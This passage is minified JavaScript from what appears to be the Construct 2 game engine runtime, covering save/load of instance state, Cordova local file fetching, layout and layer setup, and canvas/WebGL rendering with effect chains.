i,s,n,r,o,a=t.type,h=a.plugin,c={};if(e?c.c2=!0:c.uid=t.uid,cr.hasAnyOwnProperty(t.extra)&&(c.ex=F(t.extra)),t.instance_vars&&t.instance_vars.length)for(c.ivs={},i=0,s=t.instance_vars.length;i<s;i++)c.ivs[t.type.instvar_sids[i].toString()]=t.instance_vars[i];if(h.is_world){if(n={x:t.x,y:t.y,w:t.width,h:t.height,l:t.layer.sid,zi:t.get_zindex()},0!==t.angle&&(n.a=t.angle),1!==t.opacity&&(n.o=t.opacity),.5!==t.hotspotX&&(n.hX=t.hotspotX),.5!==t.hotspotY&&(n.hY=t.hotspotY),0!==t.blend_mode&&(n.bm=t.blend_mode),t.visible||(n.v=t.visible),t.collisionsEnabled||(n.ce=t.collisionsEnabled),-1!==t.my_timescale&&(n.mts=t.my_timescale),a.effect_types.length)for(n.fx=[],i=0,s=a.effect_types.length;i<s;i++)o=a.effect_types[i],n.fx.push({name:o.name,active:t.active_effect_flags[o.index],params:t.effect_params[o.index]});c.w=n}if(t.behavior_insts&&t.behavior_insts.length)for(c.behs={},i=0,s=t.behavior_insts.length;i<s;i++)(r=t.behavior_insts[i]).saveToJSON&&(c.behs[r.type.sid.toString()]=r.saveToJSON());return t.saveToJSON&&(c.data=t.saveToJSON()),c},i.prototype.getInstanceVarIndexBySid=function(t,e){for(var i=0,s=t.instvar_sids.length;i<s;i++)if(t.instvar_sids[i]===e)return i;return-1},i.prototype.getBehaviorIndexBySid=function(t,e){for(var i=0,s=t.behavior_insts.length;i<s;i++)if(t.behavior_insts[i].type.sid===e)return i;return-1},i.prototype.loadInstanceFromJSON=function(t,e,i){var s,n,r,o,a,h,c,l,u,p,d=t.type,g=d.plugin;if(i){if(!e.c2)return}else t.uid=e.uid;if(e.ex?t.extra=e.ex:cr.wipe(t.extra),a=e.ivs)for(s in a)a.hasOwnProperty(s)&&((o=this.getInstanceVarIndexBySid(d,parseInt(s,10)))<0||o>=t.instance_vars.length||(null===(p=a[s])&&(p=NaN),t.instance_vars[o]=p));if(g.is_world){if(h=e.w,t.layer.sid!==h.l&&(g=t.layer,t.layer=this.running_layout.getLayerBySid(h.l),t.layer?(g.removeFromInstanceList(t,!0),t.layer.appendToInstanceList(t,!0),t.set_bbox_changed(),t.layer.setZIndicesStaleFrom(0)):(t.layer=g,i||this.DestroyInstance(t))),t.x=h.x,t.y=h.y,t.width=h.w,t.height=h.h,t.zindex=h.zi,t.angle=h.hasOwnProperty("a")?h.a:0,t.opacity=h.hasOwnProperty("o")?h.o:1,t.hotspotX=h.hasOwnProperty("hX")?h.hX:.5,t.hotspotY=h.hasOwnProperty("hY")?h.hY:.5,t.visible=!h.hasOwnProperty("v")||h.v,t.collisionsEnabled=!h.hasOwnProperty("ce")||h.ce,t.my_timescale=h.hasOwnProperty("mts")?h.mts:-1,t.blend_mode=h.hasOwnProperty("bm")?h.bm:0,t.compositeOp=cr.effectToCompositeOp(t.blend_mode),this.gl&&cr.setGLBlend(t,t.blend_mode,this.gl),t.set_bbox_changed(),h.hasOwnProperty("fx"))for(n=0,r=h.fx.length;n<r;n++)(c=d.getEffectIndexByName(h.fx[n].name))<0||(t.active_effect_flags[c]=h.fx[n].active,t.effect_params[c]=h.fx[n].params);t.updateActiveEffects()}if(l=e.behs)for(s in l)l.hasOwnProperty(s)&&((u=this.getBehaviorIndexBySid(t,parseInt(s,10)))<0||t.behavior_insts[u].loadFromJSON(l[s]));e.data&&t.loadFromJSON(e.data)},i.prototype.fetchLocalFileViaCordova=function(t,e,i){t=cordova.file.applicationDirectory+"www/"+t;window.resolveLocalFileSystemURL(t,function(t){t.file(e,i)},i)},i.prototype.fetchLocalFileViaCordovaAsText=function(t,i,s){this.fetchLocalFileViaCordova(t,function(t){var e=new FileReader;e.onload=function(t){i(t.target.result)},e.onerror=s,e.readAsText(t)},s)};var L=[],D=0;i.prototype.maybeStartNextArrayBufferRead=function(){var t;L.length&&(8<=D||(D++,t=L.shift(),this.doFetchLocalFileViaCordovaAsArrayBuffer(t.filename,t.successCallback,t.errorCallback)))},i.prototype.fetchLocalFileViaCordovaAsArrayBuffer=function(t,e,i){var s=this;L.push({filename:t,successCallback:function(t){D--,s.maybeStartNextArrayBufferRead(),e(t)},errorCallback:function(t){D--,s.maybeStartNextArrayBufferRead(),i(t)}}),this.maybeStartNextArrayBufferRead()},i.prototype.doFetchLocalFileViaCordovaAsArrayBuffer=function(t,i,e){this.fetchLocalFileViaCordova(t,function(t){var e=new FileReader;e.onload=function(t){i(t.target.result)},e.readAsArrayBuffer(t)},e)},i.prototype.fetchLocalFileViaCordovaAsURL=function(t,e,i){var s="",n=t.toLowerCase(),r=n.substr(n.length-4),n=n.substr(n.length-5);".mp4"===r?s="video/mp4":".webm"===n?s="video/webm":".m4a"===r?s="audio/mp4":".mp3"===r&&(s="audio/mpeg"),this.fetchLocalFileViaCordovaAsArrayBuffer(t,function(t){t=new Blob([t],{type:s}),t=URL.createObjectURL(t);e(t)},i)},i.prototype.isAbsoluteUrl=function(t){return/^(?:[a-z]+:)?\/\//.test(t)||"data:"===t.substr(0,5)||"blob:"===t.substr(0,5)},i.prototype.setImageSrc=function(e,t){this.isWKWebView&&!this.isAbsoluteUrl(t)?this.fetchLocalFileViaCordovaAsURL(t,function(t){e.src=t},function(t){alert("Failed to load image: "+t)}):e.src=t},i.prototype.setCtxImageSmoothingEnabled=function(t,e){void 0!==t.imageSmoothingEnabled?t.imageSmoothingEnabled=e:(t.webkitImageSmoothingEnabled=e,t.mozImageSmoothingEnabled=e,t.msImageSmoothingEnabled=e)},cr.runtime=i,cr.createRuntime=function(t){return new i(document.getElementById(t))},cr.createDCRuntime=function(t,e){return new i({dc:!0,width:t,height:e})},window.cr_createRuntime=cr.createRuntime,window.cr_createDCRuntime=cr.createDCRuntime,window.createCocoonJSRuntime=function(){window.c2cocoonjs=!0;var t=document.createElement("screencanvas")||document.createElement("canvas");t.screencanvas=!0,document.body.appendChild(t);t=new i(t);return window.c2runtime=t,window.addEventListener("orientationchange",function(){window.c2runtime.setSize(window.innerWidth,window.innerHeight)}),window.c2runtime.setSize(window.innerWidth,window.innerHeight),t},window.createEjectaRuntime=function(){var t=new i(document.getElementById("canvas"));return window.c2runtime=t,window.c2runtime.setSize(window.innerWidth,window.innerHeight),t}}(),window.cr_getC2Runtime=function(){var t=document.getElementById("c2canvas");return t?t.c2runtime:window.c2runtime||null},window.cr_getSnapshot=function(t,e){var i=window.cr_getC2Runtime();i&&i.doCanvasSnapshot(t,e)},window.cr_sizeCanvas=function(t,e){var i;0===t||0===e||(i=window.cr_getC2Runtime())&&i.setSize(t,e)},window.cr_setSuspended=function(t){var e=window.cr_getC2Runtime();e&&e.setSuspended(t)},function(){function t(t,e){this.runtime=t,this.event_sheet=null,this.scrollX=this.runtime.original_width/2,this.scrollY=this.runtime.original_height/2,this.scale=1,this.angle=0,this.first_visit=!0,this.name=e[0],this.originalWidth=e[1],this.originalHeight=e[2],this.width=e[1],this.height=e[2],this.unbounded_scrolling=e[3],this.sheetname=e[4],this.sid=e[5];var i,s,n=e[6];for(this.layers=[],this.initial_types=[],i=0,s=n.length;i<s;i++){var r=new cr.layer(this,n[i]);r.number=i,cr.seal(r),this.layers.push(r)}var o=e[7];for(this.initial_nonworld=[],i=0,s=o.length;i<s;i++){var a=o[i],h=this.runtime.types_by_index[a[1]];h.default_instance||(h.default_instance=a),this.initial_nonworld.push(a),-1===this.initial_types.indexOf(h)&&this.initial_types.push(h)}for(this.effect_types=[],this.active_effect_types=[],this.shaders_preserve_opaqueness=!0,this.effect_params=[],i=0,s=e[8].length;i<s;i++)this.effect_types.push({id:e[8][i][0],name:e[8][i][1],shaderindex:-1,preservesOpaqueness:!1,active:!0,index:i}),this.effect_params.push(e[8][i][2].slice(0));this.updateActiveEffects(),this.rcTex=new cr.rect(0,0,1,1),this.rcTex2=new cr.rect(0,0,1,1),this.persist_data={}}t.prototype.saveObjectToPersist=function(t){var e=t.type.sid.toString();this.persist_data.hasOwnProperty(e)||(this.persist_data[e]=[]),this.persist_data[e].push(this.runtime.saveInstanceToJSON(t))},t.prototype.hasOpaqueBottomLayer=function(){var t=this.layers[0];return!t.transparent&&1===t.opacity&&!t.forceOwnTexture&&t.visible},t.prototype.updateActiveEffects=function(){var t,e,i;for(cr.clearArray(this.active_effect_types),this.shaders_preserve_opaqueness=!0,t=0,e=this.effect_types.length;t<e;t++)(i=this.effect_types[t]).active&&(this.active_effect_types.push(i),i.preservesOpaqueness||(this.shaders_preserve_opaqueness=!1))},t.prototype.getEffectByName=function(t){for(var e,i=0,s=this.effect_types.length;i<s;i++)if((e=this.effect_types[i]).name===t)return e;return null};var m=[];function y(t,e){return t.zindex-e.zindex}var _=!0;t.prototype.startRunning=function(){var t,e,i,s,n,r,o,a,h,c,l,u,p,d,g;for(this.sheetname&&(this.event_sheet=this.runtime.eventsheets[this.sheetname],this.event_sheet.updateDeepIncludes()),(this.runtime.running_layout=this).width=this.originalWidth,this.height=this.originalHeight,this.scrollX=this.runtime.original_width/2,this.scrollY=this.runtime.original_height/2,t=0,i=this.runtime.types_by_index.length;t<i;t++)if(!(n=this.runtime.types_by_index[t]).is_family)for(e=0,s=(r=n.instances).length;e<s;e++)(d=r[e]).layer&&((p=d.layer.number)>=this.layers.length&&(p=this.layers.length-1),d.layer=this.layers[p],-1===d.layer.instances.indexOf(d)&&d.layer.instances.push(d),d.layer.zindices_stale=!0);if(!_)for(t=0,i=this.layers.length;t<i;++t)this.layers[t].instances.sort(y);for(cr.clearArray(m),this.boundScrolling(),t=0,i=this.layers.length;t<i;t++)(g=this.layers[t]).createInitialInstances(),g.updateViewport(null);var f=!1;if(!this.first_visit){for(l in this.persist_data)if(this.persist_data.hasOwnProperty(l)&&(n=this.runtime.getObjectTypeBySid(parseInt(l,10)))&&!n.is_family&&this.runtime.typeHasPersistBehavior(n)){for(t=0,i=(u=this.persist_data[l]).length;t<i;t++)g=null,n.plugin.is_world&&!(g=this.getLayerBySid(u[t].w.l))||(d=this.runtime.createInstanceFromInit(n.default_instance,g,!1,0,0,!0),this.runtime.loadInstanceFromJSON(d,u[t]),f=!0,m.push(d));cr.clearArray(u)}for(t=0,i=this.layers.length;t<i;t++)this.layers[t].instances.sort(y),this.layers[t].zindices_stale=!0}for(f&&(this.runtime.ClearDeathRow(),this.runtime.refreshUidMap()),t=0;t<m.length;t++)if((d=m[t]).type.is_contained)for(a=d.get_iid(),e=0,s=d.type.container.length;e<s;e++)h=d.type.container[e],d.type!==h&&(h.instances.length>a?d.siblings.push(h.instances[a]):h.default_instance&&(c=this.runtime.createInstanceFromInit(h.default_instance,d.layer,!0,d.x,d.y,!0),this.runtime.ClearDeathRow(),h.updateIIDs(),d.siblings.push(c),m.push(c)));for(t=0,i=this.initial_nonworld.length;t<i;t++)o=this.initial_nonworld[t],(n=this.runtime.types_by_index[o[1]]).is_contained||(d=this.runtime.createInstanceFromInit(this.initial_nonworld[t],null,!0));if(this.runtime.changelayout=null,this.runtime.ClearDeathRow(),this.runtime.ctx&&!this.runtime.isDomFree)for(t=0,i=this.runtime.types_by_index.length;t<i;t++)!(h=this.runtime.types_by_index[t]).is_family&&h.instances.length&&h.preloadCanvas2D&&h.preloadCanvas2D(this.runtime.ctx);if(this.runtime.isLoadingState)cr.shallowAssignArray(this.runtime.fireOnCreateAfterLoad,m);else for(t=0,i=m.length;t<i;t++)d=m[t],this.runtime.trigger(Object.getPrototypeOf(d.type.plugin).cnds.OnCreated,d);cr.clearArray(m),this.runtime.isLoadingState||this.runtime.trigger(cr.system_object.prototype.cnds.OnLayoutStart,null),this.first_visit=!1},t.prototype.createGlobalNonWorlds=function(){for(var t,e,i=0,s=0,n=this.initial_nonworld.length;i<n;i++)t=this.initial_nonworld[i],(e=this.runtime.types_by_index[t[1]]).global?e.is_contained||this.runtime.createInstanceFromInit(t,null,!0):(this.initial_nonworld[s]=t,s++);cr.truncateArray(this.initial_nonworld,s)},t.prototype.stopRunning=function(){var t,e,i,s,n,r,o;if(this.runtime.isLoadingState||this.runtime.trigger(cr.system_object.prototype.cnds.OnLayoutEnd,null),this.runtime.isEndingLayout=!0,cr.clearArray(this.runtime.system.waits),!this.first_visit)for(t=0,e=this.layers.length;t<e;t++)for(this.layers[t].updateZIndices(),i=0,s=(n=this.layers[t].instances).length;i<s;i++)(r=n[i]).type.global||this.runtime.typeHasPersistBehavior(r.type)&&this.saveObjectToPersist(r);for(t=0,e=this.layers.length;t<e;t++){for(i=0,s=(n=this.layers[t].instances).length;i<s;i++)(r=n[i]).type.global||this.runtime.DestroyInstance(r);this.runtime.ClearDeathRow(),cr.clearArray(n),this.layers[t].zindices_stale=!0}for(t=0,e=this.runtime.types_by_index.length;t<e;t++)if(!((o=this.runtime.types_by_index[t]).global||o.plugin.is_world||o.plugin.singleglobal||o.is_family)){for(i=0,s=o.instances.length;i<s;i++)this.runtime.DestroyInstance(o.instances[i]);this.runtime.ClearDeathRow()}_=!1,this.runtime.isEndingLayout=!1};var a=new cr.rect(0,0,0,0);function e(t,e){this.layout=t,this.runtime=t.runtime,this.instances=[],this.scale=1,this.angle=0,this.disableAngle=!1,this.tmprect=new cr.rect(0,0,0,0),this.tmpquad=new cr.quad,this.viewLeft=0,this.viewRight=0,this.viewTop=0,this.viewBottom=0,this.zindices_stale=!1,this.zindices_stale_from=-1,this.clear_earlyz_index=0,this.name=e[0],this.index=e[1],this.sid=e[2],this.visible=e[3],this.background_color=e[4],this.transparent=e[5],this.parallaxX=e[6],this.parallaxY=e[7],this.opacity=e[8],this.forceOwnTexture=e[9],this.useRenderCells=e[10],this.zoomRate=e[11],this.blend_mode=e[12],this.effect_fallback=e[13],this.compositeOp="source-over",this.srcBlend=0,this.destBlend=0,this.render_grid=null,this.last_render_list=h(),this.render_list_stale=!0,this.last_render_cells=new cr.rect(0,0,-1,-1),this.cur_render_cells=new cr.rect(0,0,-1,-1),this.useRenderCells&&(this.render_grid=new cr.RenderGrid(this.runtime.original_width,this.runtime.original_height)),this.render_offscreen=!1;var i,s,n=e[14];for(this.startup_initial_instances=[],this.initial_instances=[],this.created_globals=[],i=0,s=n.length;i<s;i++){var r=n[i],o=this.runtime.types_by_index[r[1]];o.default_instance||(o.default_instance=r,o.default_layerindex=this.index),this.initial_instances.push(r),-1===this.layout.initial_types.indexOf(o)&&this.layout.initial_types.push(o)}for(cr.shallowAssignArray(this.startup_initial_instances,this.initial_instances),this.effect_types=[],this.active_effect_types=[],this.shaders_preserve_opaqueness=!0,this.effect_params=[],i=0,s=e[15].length;i<s;i++)this.effect_types.push({id:e[15][i][0],name:e[15][i][1],shaderindex:-1,preservesOpaqueness:!1,active:!0,index:i}),this.effect_params.push(e[15][i][2].slice(0));this.updateActiveEffects(),this.rcTex=new cr.rect(0,0,1,1),this.rcTex2=new cr.rect(0,0,1,1)}t.prototype.recreateInitialObjects=function(t,e,i,s,n){var r,o;for(a.set(e,i,s,n),r=0,o=this.layers.length;r<o;r++)this.layers[r].recreateInitialObjects(t,a)},t.prototype.draw=function(t){var e,i,s,n,r=t,o=!1,a=!this.runtime.fullscreenScalingQuality;for(a&&(this.runtime.layout_canvas||(this.runtime.layout_canvas=document.createElement("canvas"),(e=this.runtime.layout_canvas).width=this.runtime.draw_width,e.height=this.runtime.draw_height,this.runtime.layout_ctx=e.getContext("2d"),o=!0),e=this.runtime.layout_canvas,r=this.runtime.layout_ctx,e.width!==this.runtime.draw_width&&(e.width=this.runtime.draw_width,o=!0),e.height!==this.runtime.draw_height&&(e.height=this.runtime.draw_height,o=!0),o&&this.runtime.setCtxImageSmoothingEnabled(r,this.runtime.linearSampling)),r.globalAlpha=1,r.globalCompositeOperation="source-over",this.runtime.clearBackground&&!this.hasOpaqueBottomLayer()&&r.clearRect(0,0,this.runtime.draw_width,this.runtime.draw_height),i=0,s=this.layers.length;i<s;i++)(n=this.layers[i]).visible&&0<n.opacity&&11!==n.blend_mode&&(n.instances.length||!n.transparent)?n.draw(r):n.updateViewport(null);a&&t.drawImage(e,0,0,this.runtime.width,this.runtime.height)},t.prototype.drawGL_earlyZPass=function(t){var e,i;for(t.setEarlyZPass(!0),this.runtime.layout_tex||(this.runtime.layout_tex=t.createEmptyTexture(this.runtime.draw_width,this.runtime.draw_height,this.runtime.linearSampling)),this.runtime.layout_tex.c2width===this.runtime.draw_width&&this.runtime.layout_tex.c2height===this.runtime.draw_height||(t.deleteTexture(this.runtime.layout_tex),this.runtime.layout_tex=t.createEmptyTexture(this.runtime.draw_width,this.runtime.draw_height,this.runtime.linearSampling)),t.setRenderingToTexture(this.runtime.layout_tex),this.runtime.fullscreenScalingQuality||t.setSize(this.runtime.draw_width,this.runtime.draw_height),e=this.layers.length-1;0<=e;--e)(i=this.layers[e]).visible&&1===i.opacity&&i.shaders_preserve_opaqueness&&0===i.blend_mode&&(i.instances.length||!i.transparent)?i.drawGL_earlyZPass(t):i.updateViewport(null);t.setEarlyZPass(!1)},t.prototype.drawGL=function(t){var e,i,s,n,r=0<this.active_effect_types.length||this.runtime.uses_background_blending||!this.runtime.fullscreenScalingQuality||this.runtime.enableFrontToBack;for(r?(this.runtime.layout_tex||(this.runtime.layout_tex=t.createEmptyTexture(this.runtime.draw_width,this.runtime.draw_height,this.runtime.linearSampling)),this.runtime.layout_tex.c2width===this.runtime.draw_width&&this.runtime.layout_tex.c2height===this.runtime.draw_height||(t.deleteTexture(this.runtime.layout_tex),this.runtime.layout_tex=t.createEmptyTexture(this.runtime.draw_width,this.runtime.draw_height,this.runtime.linearSampling)),t.setRenderingToTexture(this.runtime.layout_tex),this.runtime.fullscreenScalingQuality||t.setSize(this.runtime.draw_width,this.runtime.draw_height)):this.runtime.layout_tex&&(t.setRenderingToTexture(null),t.deleteTexture(this.runtime.layout_tex),this.runtime.layout_tex=null),this.runtime.clearBackground&&!this.hasOpaqueBottomLayer()&&t.clear(0,0,0,0),e=0,i=this.layers.length;e<i;e++)(s=this.layers[e]).visible&&0<s.opacity&&(s.instances.length||!s.transparent)?s.drawGL(t):s.updateViewport(null);r&&(0===this.active_effect_types.length||1===this.active_effect_types.length&&this.runtime.fullscreenScalingQuality?(1===this.active_effect_types.length?(n=this.active_effect_types[0].index,t.switchProgram(this.active_effect_types[0].shaderindex),t.setProgramParameters(null,1/this.runtime.draw_width,1/this.runtime.draw_height,0,0,1,1,this.scale,this.angle,0,0,this.runtime.draw_width/2,this.runtime.draw_height/2,this.runtime.kahanTime.sum,this.effect_params[n]),t.programIsAnimated(this.active_effect_types[0].shaderindex)&&(this.runtime.redraw=!0)):t.switchProgram(0),this.runtime.fullscreenScalingQuality||t.setSize(this.runtime.width,this.runtime.height),t.setRenderingToTexture(null),t.setDepthTestEnabled(!1),t.setOpacity(1),t.setTexture(this.runtime.layout_tex),t.setAlphaBlend(),t.resetModelView(),t.updateModelView(),r=this.runtime.width/2,n=this.runtime.height/2,t.quad(-r,n,r,n,r,-n,-r,-n),t.setTexture(null),t.setDepthTestEnabled(!0)):this.renderEffectChain(t,null,null,null))},t.prototype.getRenderTarget=function(){return 0<this.active_effect_types.length||this.runtime.uses_background_blending||!this.runtime.fullscreenScalingQuality||this.runtime.enableFrontToBack?this.runtime.layout_tex:null},t.prototype.getMinLayerScale=function(){for(var t,e=this.layers[0].getScale(),i=1,s=this.layers.length;i<s;i++)0===(t=this.layers[i]).parallaxX&&0===t.parallaxY||t.getScale()<e&&(e=t.getScale());return e},t.prototype.scrollToX=function(t){var e;this.unbounded_scrolling||(e=this.runtime.draw_width*(1/this.getMinLayerScale())/2,t>this.width-e&&(t=this.width-e),t<e&&(t=e)),this.scrollX!==t&&(this.scrollX=t,this.runtime.redraw=!0)},t.prototype.scrollToY=function(t){var e;this.unbounded_scrolling||(e=this.runtime.draw_height*(1/this.getMinLayerScale())/2,t>this.height-e&&(t=this.height-e),t<e&&(t=e)),this.scrollY!==t&&(this.scrollY=t,this.runtime.redraw=!0)},t.prototype.boundScrolling=function(){this.scrollToX(this.scrollX),this.scrollToY(this.scrollY)},t.prototype.renderEffectChain=function(t,e,i,s){var n=(i||e||this).active_effect_types,r=1,o=0,a=0,h=0,c=this.runtime.draw_width,l=this.runtime.draw_height;i?(r=i.layer.getScale(),o=i.layer.getAngle(),a=i.layer.viewLeft,h=i.layer.viewTop,c=i.layer.viewRight,l=i.layer.viewBottom):e&&(r=e.getScale(),o=e.getAngle(),a=e.viewLeft,h=e.viewTop,c=e.viewRight,l=e.viewBottom);var u,p,d=this.runtime.fx_tex,g=0,f=1,m=this.runtime.draw_width,y=this.runtime.draw_height,_=m/2,v=y/2,b=(e||this).rcTex,w=(e||this).rcTex2,x=0,S=0,T=0,C=0,O=m,k=m,A=y,E=y,I=0,P=0,M=i?i.layer.getAngle():0;if(i){for(W=0,z=n.length;W<z;W++)I+=t.getProgramBoxExtendHorizontal(n[W].shaderindex),P+=t.getProgramBoxExtendVertical(n[W].shaderindex);var F,L,D,R=i.bbox;x=e.layerToCanvas(R.left,R.top,!0,!0),T=e.layerToCanvas(R.left,R.top,!1,!0),O=e.layerToCanvas(R.right,R.bottom,!0,!0),A=e.layerToCanvas(R.right,R.bottom,!1,!0),0!==M&&(F=e.layerToCanvas(R.right,R.top,!0,!0),L=e.layerToCanvas(R.right,R.top,!1,!0),M=e.layerToCanvas(R.left,R.bottom,!0,!0),R=e.layerToCanvas(R.left,R.bottom,!1,!0),D=Math.min(x,O,F,M),O=Math.max(x,O,F,M),x=D,D=Math.min(T,A,L,R),A=Math.max(T,A,L,R),T=D),x-=I,T-=P,O+=I,A+=P,w.left=x/m,w.top=1-T/y,w.right=O/m,w.bottom=1-A/y,S=x=cr.floor(x),C=T=cr.floor(T),k=O=cr.ceil(O),E=A=cr.ceil(A),x<0&&(x=0),T<0&&(T=0),m<O&&(O=m),y<A&&(A=y),(S-=I)<0&&(S=0),(C-=P)<0&&(C=0),m<(k+=I)&&(k=m),y<(E+=P)&&(E=y),b.left=x/m,b.top=1-T/y,b.right=O/m,b.bottom=1-A/y}else b.left=w.left=0,b.top=w.top=0,b.right=w.right=1,b.bottom=w.bottom=1;var j=i&&(t.programUsesDest(n[0].shaderindex)||0!==I||0!==P||1!==i.opacity||i.type.plugin.must_predraw)||e&&!i&&1!==e.opacity;t.setAlphaBlend(),j&&(d[g]||(d[g]=t.createEmptyTexture(m,y,this.runtime.linearSampling)),d[g].c2width===m&&d[g].c2height===y||(t.deleteTexture(d[g]),d[g]=t.createEmptyTexture(m,y,this.runtime.linearSampling)),t.switchProgram(0),t.setRenderingToTexture(d[g]),u=y-C-(p=E-C),t.clearRect(S,u,k-S,p),i?i.drawGL(t):(t.setTexture(this.runtime.layer_tex),t.setOpacity(e.opacity),t.resetModelView(),t.translate(-_,-v),t.updateModelView(),t.quadTex(x,A,O,A,O,T,x,T,b)),w.left=w.top=0,w.right=w.bottom=1,i&&(D=b.top,b.top=b.bottom,b.bottom=D),g=1,f=0),t.setOpacity(1);for(var B,N,V,G=n.length-1,X=t.programUsesCrossSampling(n[G].shaderindex)||!e&&!i&&!this.runtime.fullscreenScalingQuality,W=0,z=n.length;W<z;W++)d[g]||(d[g]=t.createEmptyTexture(m,y,this.runtime.linearSampling)),d[g].c2width===m&&d[g].c2height===y||(t.deleteTexture(d[g]),d[g]=t.createEmptyTexture(m,y,this.runtime.linearSampling)),t.switchProgram(n[W].shaderindex),B=n[W].index,t.programIsAnimated(n[W].shaderindex)&&(this.runtime.redraw=!0),0!=W||j?(t.setProgramParameters(s,1/m,1/y,w.left,w.top,w.right,w.bottom,r,o,a,h,(a+c)/2,(h+l)/2,this.runtime.kahanTime.sum,(i||e||this).effect_params[B]),t.setTexture(null),W!==G||X?(t.setRenderingToTexture(d[g]),u=y-C-(p=E-C),t.clearRect(S,u,k-S,p)):(i?t.setBlend(i.srcBlend,i.destBlend):e&&t.setBlend(e.srcBlend,e.destBlend),t.setRenderingToTexture(s)),t.setTexture(d[f]),t.resetModelView(),t.translate(-_,-v),t.updateModelView(),t.quadTex(x,A,O,A,O,T,x,T,b),W!==G||X||t.setTexture(null)):(t.setRenderingToTexture(d[g]),u=y-C-(p=E-C),t.clearRect(S,u,k-S,p),i?(V=i.curFrame&&i.curFrame.texture_img?(N=1/(V=i.curFrame.texture_img).width,1/V.height):(N=1/i.width,1/i.height),t.setProgramParameters(s,N,V,w.left,w.top,w.right,w.bottom,r,o,a,h,(a+c)/2,(h+l)/2,this.runtime.kahanTime.sum,i.effect_params[B]),i.drawGL(t)):(t.setProgramParameters(s,1/m,1/y,0,0,1,1,r,o,a,h,(a+c)/2,(h+l)/2,this.runtime.kahanTime.sum,(e||this).effect_params[B]),t.setTexture(e?this.runtime.layer_tex:this.runtime.layout_tex),t.resetModelView(),t.translate(-_,-v),t.updateModelView(),t.quadTex(x,A,O,A,O,T,x,T,b)),w.left=w.top=0,w.right=w.bottom=1,i&&!X&&(D=A,A=T,T=D)),f=0===(g=0===g?1:0)?1:0;X&&(t.switchProgram(0),i?t.setBlend(i.srcBlend,i.destBlend):e?t.setBlend(e.srcBlend,e.destBlend):this.runtime.fullscreenScalingQuality||(t.setSize(this.runtime.width,this.runtime.height),_=this.runtime.width/2,v=this.runtime.height/2,T=x=0,O=this.runtime.width,A=this.runtime.height),t.setRenderingToTexture(s),t.setTexture(d[f]),t.resetModelView(),t.translate(-_,-v),t.updateModelView(),i&&1===n.length&&!j?t.quadTex(x,T,O,T,O,A,x,A,b):t.quadTex(x,A,O,A,O,T,x,T,b),t.setTexture(null))},t.prototype.getLayerBySid=function(t){for(var e=0,i=this.layers.length;e<i;e++)if(this.layers[e].sid===t)return this.layers[e];return null},t.prototype.saveToJSON=function(){for(var t,e,i={sx:this.scrollX,sy:this.scrollY,s:this.scale,a:this.angle,w:this.width,h:this.height,fv:this.first_visit,persist:this.persist_data,fx:[],layers:{}},s=0,n=this.effect_types.length;s<n;s++)e=this.effect_types[s],i.fx.push({name:e.name,active:e.active,params:this.effect_params[e.index]});for(s=0,n=this.layers.length;s<n;s++)t=this.layers[s],i.layers[t.sid.toString()]=t.saveToJSON();return i},t.prototype.loadFromJSON=function(t){var e,i,s;this.scrollX=t.sx,this.scrollY=t.sy,this.scale=t.s,this.angle=t.a,this.width=t.w,this.height=t.h,this.persist_data=t.persist,void 0!==t.fv&&(this.first_visit=t.fv);for(var n=t.fx,r=0,o=n.length;r<o;r++)(e=this.getEffectByName(n[r].name))&&(e.active=n[r].active,this.effect_params[e.index]=n[r].params);this.updateActiveEffects();var a=t.layers;for(i in a)a.hasOwnProperty(i)&&(s=this.getLayerBySid(parseInt(i,10)))&&s.loadFromJSON(a[i])},cr.layout=t,e.prototype.updateActiveEffects=function(){var t,e,i;for(cr.clearArray(this.active_effect_types),this.shaders_preserve_opaqueness=!0,t=0,e=this.effect_types.length;t<e;t++)(i=this.effect_types[t]).active&&(this.active_effect_types.push(i),i.preservesOpaqueness||(this.shaders_preserve_opaqueness=!1))},e.prototype.getEffectByName=function(t){for(var e,i=0,s=this.effect_types.length;i<s;i++)if((e=this.effect_types[i]).name===t)return e;return null},e.prototype.createInitialInstances=function(){for(var t,e,i,s=0,n=0,r=this.initial_instances.length;s<r;s++){if(t=this.initial_instances[s],e=this.runtime.types_by_index[t[1]],i=!0,!this.runtime.typeHasPersistBehavior(e)||this.layout.first_visit){if(!(t=this.runtime.createInstanceFromInit(t,this,!0)))continue;m.push(t),t.type.global&&(i=!1,this.created_globals.push(t.uid))}i&&(this.initial_instances[n]=this.initial_instances[s],n++)}this.initial_instances.length=n,this.runtime.ClearDeathRow(),!this.runtime.glwrap&&this.effect_types.length&&(this.blend_mode=this.effect_fallback),this.compositeOp=cr.effectToCompositeOp(this.blend_mode),this.runtime.gl&&cr.setGLBlend(this,this.blend_mode,this.runtime.gl),this.render_list_stale=!0},e.prototype.recreateInitialObjects=function(t,e){for(var i,s,n,r,o,a,h,c=this.runtime.types_by_index,l=t.is_family,u=t.members,p=0,d=this.initial_instances.length;p<d;++p)if(s=(n=(i=this.initial_instances[p])[0])[0],n=n[1],e.contains_pt(s,n)){if((n=c[i[1]])!==t){if(!l)continue;if(u.indexOf(n)<0)continue}if(r=this.runtime.createInstanceFromInit(i,this,!1),this.runtime.isInOnDestroy++,this.runtime.trigger(Object.getPrototypeOf(n.plugin).cnds.OnCreated,r),r.is_contained)for(o=0,a=r.siblings.length;o<a;o++)h=r.siblings[p],this.runtime.trigger(Object.getPrototypeOf(h.type.plugin).cnds.OnCreated,h);this.runtime.isInOnDestroy--}},e.prototype.removeFromInstanceList=function(t,e){var i=cr.fastIndexOf(this.instances,t);i<0||(e&&this.useRenderCells&&t.rendercells&&t.rendercells.right>=t.rendercells.left&&(t.update_bbox(),this.render_grid.update(t,t.rendercells,null),t.rendercells.set(0,0,-1,-1)),i===this.instances.length-1?this.instances.pop():(cr.arrayRemove(this.instances,i),this.setZIndicesStaleFrom(i)),this.render_list_stale=!0)},e.prototype.appendToInstanceList=function(t,e){t.zindex=this.instances.length,this.instances.push(t),e&&this.useRenderCells&&t.rendercells&&t.set_bbox_changed(),this.render_list_stale=!0},e.prototype.prependToInstanceList=function(t,e){this.instances.unshift(t),this.setZIndicesStaleFrom(0),e&&this.useRenderCells&&t.rendercells&&t.set_bbox_changed()},e.prototype.moveInstanceAdjacent=function(t,e,i){var 